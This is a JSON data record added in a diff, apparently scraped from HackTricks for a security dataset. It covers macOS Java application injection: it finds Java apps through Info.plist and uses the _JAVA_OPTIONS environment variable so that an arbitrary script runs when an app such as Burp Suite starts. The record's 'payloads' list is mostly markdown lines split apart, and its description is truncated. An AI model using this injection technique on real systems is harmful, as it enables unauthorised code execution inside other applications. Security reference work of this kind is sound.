@@ -1,0 +1,27 @@
+{
+  "id": "macos_hardening_9105fb657344",
+  "category": "macos-hardening",
+  "title": "macos java apps injection",
+  "description": "# macOS Java Applications Injection\n\n{{#include ../../../banners/hacktricks-training.md}}\n\n## Enumeration\n\nFind Java applications installed in your system. It was noticed that Java apps in the **Info.plist** will contain some java parameters which contain the string **`java.`**, so you can search for that:\n\n```bash\n# Search only in /Applications folder\nsudo find /Applications -name 'Info.plist' -exec grep -l \"java\\.\" {} \\; 2>/dev/null\n\n# Full search\nsudo find / -name 'Info.plist' -exec grep -l \"",
+  "payloads": [
+    "# macOS Java Applications Injection",
+    "{{#include ../../../banners/hacktricks-training.md}}",
+    "## Enumeration",
+    "Find Java applications installed in your system. It was noticed that Java apps in the **Info.plist** will contain some java parameters which contain the string **`java.`**, so you can search for that:",
+    "```bash",
+    "# Search only in /Applications folder",
+    "sudo find /Applications -name 'Info.plist' -exec grep -l \"java\\.\" {} \\; 2>/dev/null",
+    "# Full search",
+    "sudo find / -name 'Info.plist' -exec grep -l \"java\\.\" {} \\; 2>/dev/null",
+    "## \\_JAVA_OPTIONS",
+    "The env variable **`_JAVA_OPTIONS`** can be used to inject arbitrary java parameters in the execution of a java compiled app:",
+    "```bash",
+    "# Write your payload in a script called /tmp/payload.sh",
+    "export _JAVA_OPTIONS='-Xms2m -Xmx5m -XX:OnOutOfMemoryError=\"/tmp/payload.sh\"'",
+    "\"/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub\""
+  ],
+  "source": "HackTricks",
+  "references": [
+    "/workspaces/hunter-skill/hacktricks/src/macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-java-apps-injection.md"
+  ]
+}
